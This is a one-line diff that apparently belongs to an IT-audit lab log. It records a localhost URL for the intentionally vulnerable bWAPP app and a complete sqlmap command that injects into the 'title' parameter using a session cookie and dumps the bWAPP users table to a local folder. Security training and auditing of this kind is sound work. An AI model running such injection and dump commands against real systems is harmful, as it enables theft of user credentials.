@@ -1,0 +1,1 @@
+http://localhost:8080/sqli_1.php?title=test&action=search (GET)  # /usr/local/bin/sqlmap -u http://localhost:8080/sqli_1.php?title=test&action=search "--cookie=PHPSESSID=e80n2m3bhf25qrkaohk681ib22; security_level=0" -p title --batch -D bWAPP -T users --dump --output-dir=/home/ravi/Projects/it_audit/doc/sqlmap_output
